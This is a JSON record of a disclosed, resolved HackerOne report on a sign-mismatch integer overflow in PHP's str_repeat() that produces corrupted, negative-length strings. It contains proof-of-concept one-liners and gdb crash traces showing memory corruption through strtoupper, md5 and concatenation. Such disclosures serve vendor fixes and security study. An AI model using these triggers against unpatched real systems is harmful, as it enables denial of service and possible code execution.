{"id":73255,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI1NQ==","url":"https://hackerone.com/reports/73255","title":"str_repeat() sign mismatch based memory corruption","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-09T00:00:00.000Z","submitted_at":"2015-04-09T00:00:00.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cogitoergor00t","url":"/cogitoergor00t","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/020/061/8c7b3fd2883a175ed23e98992225ad21b5033a20_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-05-12T00:00:00.000Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2015-05-12T00:00:00.000Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# OVERVIEW\nstr_repeat() suffers from a sign mismatch based integer overflow that results in creation of corrupted ZVALs; this condition, depending on the context, can be abused to bypass PHP-level checks or trigger any kind of memory error: a successful exploitation of this issue is likely to produce both local and remote code execution vectors.\n\n# DETAILS\nstr_repeat() takes mult as second argument, which represents the number of desired repetitions for the string passed as first argument. Once retrieved, this value is multiplied by input_len and stored into result_len\n\n```\n    /* Initialize the result string */\n4907    result_len = input_len * mult;\nwhich then, on line 4930 is passed as argument for RETURN_STRINGL() macro.\nIt should be noticed that while RETURN_STRINGL() ends up calling ZVAL_STRINGL(), which expects the length argument to be a signed int, result_len is defined as size_t, producing an implicit cast of the actual value.\nIn situations in which huge memory allocations are possible (most likely 64-bit systems), it is possible to take advantage of this situation overflowing ZVAL_STRINGL's length into a negative value, in order to get a corrupted string-typed ZVAL.\n(gdb) r -r 'var_dump(str_repeat(\"a\", 4294967294+1));'\n\nBreakpoint 1, php_var_dump (struc=0x7ffff7f8a188, level=level@entry=1)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c:88\n88        /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c: No such file or directory.\n(gdb) p **struc\n$7 = {value = {lval = 140732723359792, dval = 6,9531203857753119e-310, str = {\n      val = 0x7ffee3fbf030 'a' \u003crepeats 200 times\u003e..., len = -1}, \n    ht = 0x7ffee3fbf030, obj = {handle = 3824939056, \n      handlers = 0x7fffffffffff}, ast = 0x7ffee3fbf030}, refcount__gc = 1, \n  type = 6 '\\006', is_ref__gc = 0 '\\000'}\n```\n\n# EXPLOITATION\nThe easiest use of this issue could be bypassing PHP-level checks:\n\n```\n$ php -r 'echo strlen(str_repeat(\"a\", 4294967294));'\n-2\n```\n\nMore interesting scenario comes up when more complex elaborations are applied to a corrupted ZVAL, here I'm gonna list a non-exaustive series of examples which could differ both in severity and exploitability, just to give you an idea.\n\n```\n(gdb) r -r 'strtoupper(str_repeat(\"a\", 4294967294+1));'\nStarting program: /usr/bin/php -r 'strtoupper(str_repeat(\"a\", 4294967294+1));'\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n37        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) x/i $pc\n=\u003e 0x7ffff5b2b005 \u003c__memcpy_sse2_unaligned+53\u003e:        movdqu %xmm8,-0x10(%rdi,%rdx,1)\n\n(gdb) p/x $rdx\n$15 = 0xffffffff\n \u003c== user controlled\n(gdb) p/x $rdi\n$16 = 0x7ffff7fc0a70\n(gdb) p $xmm8\n$17 = {v4_float = {2,59845894e+20, 2,59845894e+20, 2,59845894e+20, \n    2,59845894e+20}, v2_double = {1,2217638442043777e+161, \n    1,2217638442043777e+161}, v16_int8 = {97 \u003crepeats 16 times\u003e}, v8_int16 = {\n    24929, 24929, 24929, 24929, 24929, 24929, 24929, 24929}, v4_int32 = {\n    1633771873, 1633771873, 1633771873, 1633771873}, v2_int64 = {\n    7016996765293437281, 7016996765293437281}, \n  uint128 = 0x61616161616161616161616161616161}\n\n\n\n(gdb) r -r 'md5(str_repeat(\"a\", 4294967294-1));'\n\nProgram received signal SIGSEGV, Segmentation fault.\nbody (ctx=ctx@entry=0x7fffffffc5c0, data=data@entry=0x7ffee3fbf030, \n    size=18446744069414182912)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c:214\n214        /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c: No such file or directory.\n\n\n(gdb) r -r 'str_repeat(\"a\", 4294967294+1).\"\";'\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152\n152        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n```\n","vulnerability_information_html":"\u003ch1 id=\"overview\"\u003eOVERVIEW\u003c/h1\u003e\n\n\u003cp\u003estr_repeat() suffers from a sign mismatch based integer overflow that results in creation of corrupted ZVALs; this condition, depending on the context, can be abused to bypass PHP-level checks or trigger any kind of memory error: a successful exploitation of this issue is likely to produce both local and remote code execution vectors.\u003c/p\u003e\n\n\u003ch1 id=\"details\"\u003eDETAILS\u003c/h1\u003e\n\n\u003cp\u003estr_repeat() takes mult as second argument, which represents the number of desired repetitions for the string passed as first argument. Once retrieved, this value is multiplied by input_len and stored into result_len\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    /* Initialize the result string */\n4907    result_len = input_len * mult;\nwhich then, on line 4930 is passed as argument for RETURN_STRINGL() macro.\nIt should be noticed that while RETURN_STRINGL() ends up calling ZVAL_STRINGL(), which expects the length argument to be a signed int, result_len is defined as size_t, producing an implicit cast of the actual value.\nIn situations in which huge memory allocations are possible (most likely 64-bit systems), it is possible to take advantage of this situation overflowing ZVAL_STRINGL\u0026#39;s length into a negative value, in order to get a corrupted string-typed ZVAL.\n(gdb) r -r \u0026#39;var_dump(str_repeat(\u0026quot;a\u0026quot;, 4294967294+1));\u0026#39;\n\nBreakpoint 1, php_var_dump (struc=0x7ffff7f8a188, level=level@entry=1)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c:88\n88        /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c: No such file or directory.\n(gdb) p **struc\n$7 = {value = {lval = 140732723359792, dval = 6,9531203857753119e-310, str = {\n      val = 0x7ffee3fbf030 \u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;..., len = -1}, \n    ht = 0x7ffee3fbf030, obj = {handle = 3824939056, \n      handlers = 0x7fffffffffff}, ast = 0x7ffee3fbf030}, refcount__gc = 1, \n  type = 6 \u0026#39;\\006\u0026#39;, is_ref__gc = 0 \u0026#39;\\000\u0026#39;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"exploitation\"\u003eEXPLOITATION\u003c/h1\u003e\n\n\u003cp\u003eThe easiest use of this issue could be bypassing PHP-level checks:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ php -r \u0026#39;echo strlen(str_repeat(\u0026quot;a\u0026quot;, 4294967294));\u0026#39;\n-2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMore interesting scenario comes up when more complex elaborations are applied to a corrupted ZVAL, here I\u0026#39;m gonna list a non-exaustive series of examples which could differ both in severity and exploitability, just to give you an idea.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) r -r \u0026#39;strtoupper(str_repeat(\u0026quot;a\u0026quot;, 4294967294+1));\u0026#39;\nStarting program: /usr/bin/php -r \u0026#39;strtoupper(str_repeat(\u0026quot;a\u0026quot;, 4294967294+1));\u0026#39;\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n37        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) x/i $pc\n=\u0026gt; 0x7ffff5b2b005 \u0026lt;__memcpy_sse2_unaligned+53\u0026gt;:        movdqu %xmm8,-0x10(%rdi,%rdx,1)\n\n(gdb) p/x $rdx\n$15 = 0xffffffff\n \u0026lt;== user controlled\n(gdb) p/x $rdi\n$16 = 0x7ffff7fc0a70\n(gdb) p $xmm8\n$17 = {v4_float = {2,59845894e+20, 2,59845894e+20, 2,59845894e+20, \n    2,59845894e+20}, v2_double = {1,2217638442043777e+161, \n    1,2217638442043777e+161}, v16_int8 = {97 \u0026lt;repeats 16 times\u0026gt;}, v8_int16 = {\n    24929, 24929, 24929, 24929, 24929, 24929, 24929, 24929}, v4_int32 = {\n    1633771873, 1633771873, 1633771873, 1633771873}, v2_int64 = {\n    7016996765293437281, 7016996765293437281}, \n  uint128 = 0x61616161616161616161616161616161}\n\n\n\n(gdb) r -r \u0026#39;md5(str_repeat(\u0026quot;a\u0026quot;, 4294967294-1));\u0026#39;\n\nProgram received signal SIGSEGV, Segmentation fault.\nbody (ctx=ctx@entry=0x7fffffffc5c0, data=data@entry=0x7ffee3fbf030, \n    size=18446744069414182912)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c:214\n214        /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c: No such file or directory.\n\n\n(gdb) r -r \u0026#39;str_repeat(\u0026quot;a\u0026quot;, 4294967294+1).\u0026quot;\u0026quot;;\u0026#39;\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152\n152        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":496267,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:44:48.344Z","updated_at":"2015-06-30T11:44:48.344Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"cogitoergor00t","url":"/cogitoergor00t"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1196230,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:44:48.344Z","updated_at":"2016-09-15T13:29:46.350Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"reporter":{"username":"cogitoergor00t","url":"/cogitoergor00t"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}